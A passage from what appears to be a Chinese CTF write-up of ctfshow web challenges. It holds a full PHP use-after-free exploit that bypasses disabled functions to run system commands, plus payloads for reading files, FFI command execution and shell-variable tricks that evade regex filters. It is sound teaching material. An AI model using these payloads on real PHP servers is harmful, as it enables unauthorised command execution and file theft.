&#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span><span class="params">($arg)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        $arg = str_shuffle(<span class="string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span>);</span><br><span class="line">        $vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">'WIN'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This PoC is for *nix systems only.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; </span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(<span class="string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span>);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">'x'</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">'args'</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"UAF failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't determine binary base address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF header"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); </span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">"cat /flag0.txt"</span>);ob_end_flush();</span><br><span class="line"><span class="comment">#需要通过url编码哦</span></span><br></pre></td></tr></table></figure></div>

<p><strong>抓post包，直接贴上去，将c后面的url加密，发包就拿到flag了</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210814050514152.png" alt="image-20210814050514152"></p>
<h2 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h2><p>读路径</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=$a=<span class="keyword">new</span> directoryiterator(<span class="string">'glob:///*'</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span> $f.<span class="string">" "</span>;&#125;;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure></div>

<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flagc.txt&quot;);exit(0);</span><br><span class="line">c&#x3D;require(&quot;&#x2F;flagc.txt&quot;);exit(0);</span><br><span class="line">c&#x3D;require_once(&quot;&#x2F;flagc.txt&quot;);exit(0);</span><br></pre></td></tr></table></figure></div>

<h2 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h2><blockquote>
<p>和上题一样</p>
</blockquote>
<h2 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h2><p>读取路径</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new directoryiterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo $f.&quot; &quot;;&#125;;exit();</span><br></pre></td></tr></table></figure></div>

<p>这题是用mysql的load_file进行读取文件，payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,</span><br><span class="line">&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210814052010208.png" alt="image-20210814052010208"></p>
</blockquote>
<h2 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h2><p>这次名字变36d，老样子，抓包拿flag</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210814052802298.png" alt="image-20210814052802298"></p>
</blockquote>
<h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>读路径</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new directoryiterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo $f.&quot; &quot;;&#125;;exit();</span><br></pre></td></tr></table></figure></div>

<p>发现了flag36x.txt和readflag，题目提示php7.4，发现是利用FF1拓展（php7.4开始才有）,payload如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">c=$ffi = FFI::cdef(<span class="string">"int system(const char *command);"</span>);$ffi-&gt;system(<span class="string">"/readflag &gt;gylq.txt"</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure></div>

<h2 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h2><p><strong>题目提示，flag在flag.php中，接着看源码，说是systemc命令执行</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210815044500697.png" alt="image-20210815044500697"></p>
</blockquote>
<p><strong>但是发现过滤了数字和小写字母等</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">[root@iZbp10rm32c5jzpurgsmsfZ ~]# echo $&#123;PATH:~0&#125;</span><br><span class="line">n</span><br><span class="line">[root@iZbp10rm32c5jzpurgsmsfZ ~]# echo $&#123;PATH:5:1&#125;</span><br><span class="line">l</span><br><span class="line">[root@iZbp10rm32c5jzpurgsmsfZ ~]# $&#123;PATH:~0&#125;$&#123;PATH:5:1&#125; flag.txt</span><br><span class="line">     1	123</span><br><span class="line">[root@iZbp10rm32c5jzpurgsmsfZ ~]# echo $&#123;PATH:~G&#125;</span><br><span class="line">n</span><br><span class="line">[root@iZbp10rm32c5jzpurgsmsfZ html]# echo $&#123;PWD:~A&#125;</span><br><span class="line">l</span><br></pre></td></tr></table></figure></div>

<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210815045854670.png" alt="image-20210815045854670"></p>
</blockquote>
<h2 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h2><blockquote>
<p>这次在前面的基础上把path给禁了，也就是我们无法获得n这个字母，也就无法构成了nl命令。接下来我们尝试构造一下<code>/bin/cat</code>，而想要匹配到我们至少需要一个<code>/</code>符号和一个<code>cat</code>中的一个字母，这里使用<code>${SHLVL}</code>来配合构造<code>/</code></p>
<p>SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}=1，然后在此shell中再打开一个shell时$SHLVL=2。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">[root@iZbp10rm32c5jzpurgsmsfZ html]# echo $&#123;SHLVL&#125;</span><br><span class="line">1</span><br><span class="line">[root@iZbp10rm32c5jzpurgsmsfZ html]# echo $&#123;PWD&#125;</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">[root@iZbp10rm32c5jzpurgsmsfZ html]# echo $&#123;#&#125;</span><br><span class="line">0</span><br><span class="line">[root@iZbp10rm32c5jzpurgsmsfZ html]# echo $&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;</span><br><span class="line">&#x2F;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>一般给的权限都是www-data，所以我们用<code>${USER}</code>可以获得“www-data”，而我们要取到at的话需要<code>${USER:~2:2}</code>，但数字是被禁了，所以接下来我们还需要想想怎么构造出2，翻了翻，这要什么来什么了，看见php的版本是7.3.22，正好包含数字2，所以利用<code>PHP_VERSION</code></p>
</blockquote>
<p>构造payload如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125;     &#x3D;&#x3D;&#x3D;&#x3D;&gt;   t</span><br><span class="line"></span><br><span class="line">$&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125;    &#x3D;&#x3D;&#x3D;&#x3D;&gt;   &#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;bin&#x2F;cat flag.php</span><br><span class="line"></span><br><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</span><br></pre></td></tr></table></figure></div>

<p><strong>群主的payload，利用php的版本来利用</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;$&#123;PHP_CFLAGS:$&#123;PHP_VERSION:$&#123;PHP_VERSION:~A&#125;:~$&#123;SHLVL&#125;&#125;:$&#123;PHP_VERSION:$&#123;PHP_VERSION:~A&#125;:~$&#123;SHLVL&#125;&#125;&#125; ????.???</span><br><span class="line"></span><br><span class="line">相当于 tac ????.???</span><br></pre></td></tr></table></figure></div>

<h2 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h2><blockquote>
<p>这回换成源码了，HOME和BASH也禁了</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code=$_POST[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\'|\"|\`|\||\,/'</span>, $code))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen($code)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;div align="center"&gt;'</span>.<span class="string">'you are so long , I dont like '</span>.<span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;div align="center"&gt;'</span>.system($code).<span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">'&lt;div align="center"&gt;evil input&lt;/div&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>但是我们可以利用?构造base64来直接访问</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">echo $&#123;PWD::$&#123;SHLVL&#125;&#125;</span><br><span class="line">构造出一个&#x2F;</span><br><span class="line">$&#123;PWD::$&#123;SHLVL&#125;&#125;???$&#123;PWD::$&#123;SHLVL&#125;&#125;b????4 flag.txt</span><br><span class="line">可以直接执行</span><br><span class="line">MTIzCg&#x3D;&#x3D;</span><br><span class="line">可以利用RANDOM来随机摇出4的长度，就可以拿flag了</span><br><span class="line">payload</span><br><span class="line"></span><br><span class="line">code&#x3D;$&#123;PWD::$&#123;SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br></pre></td></tr></table></figure></div>

<h2 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code=$_POST[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\'|\"|\`|\||\,/'</span>, $code))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen($code)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;div align="center"&gt;'</span>.<span class="string">'you are so long , I dont like '</span>.<span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;div align="center"&gt;'</span>.system($code).<span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">'&lt;div align="center"&gt;evil input&lt;/div&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">这回过滤了很多，其实我们上把的payload主要是禁了1也就是SHLVL，所以我们想办法弄出1来，刚好有一个$&#123;?&#125;如果没有输出错误，他就会返回0这个值，所以对0这值进行计数就是1即为$&#123;#?&#125;&#x3D;1</span><br></pre></td></tr></table></figure></div>

<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br></pre></td></tr></table></figure></div>

<h2 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code=$_POST[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\'|\"|\`|\||\,/'</span>, $code))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen($code)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;div align="center"&gt;'</span>.<span class="string">'you are so long , I dont like '</span>.<span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;div align="center"&gt;'</span>.system($code).<span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">'&lt;div align="center"&gt;evil input&lt;/div&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>这回#号被过滤了，也就是不能计数了，但是可以继续利用$?的机制，如果前面的一个语句报错，就会输出一次1，由于HOME放出来了，所以就改HOME获取/</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure></div>

<p>由于概率不是很高，建议用BURP直接跑包。</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210815144353097.png" alt="image-20210815144353097"></p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210815144523688.png" alt="image-20210815144523688"></p>
<h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 收集自网络</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-06 14:04:45</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>get传参C，过滤了空格等一些符号，只能利用白名单里面的函数来构造字母来进行命令执行，并且长度不能大于80，按照提示的数学函数进行使用，这么多白名单也注定了有多种payload</p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210815155027085.png" alt="image-20210815155027085"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210815155044208.png" alt="image-20210815155044208"></p>
<p>我们利用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">system(getallheaders()&#123;1&#125;)</span><br><span class="line">通过更改1对应的header值，来控制输出</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210815155156652.png" alt="image-20210815155156652"></p>
<p>我写了个php，执行以下了解下过程</p>
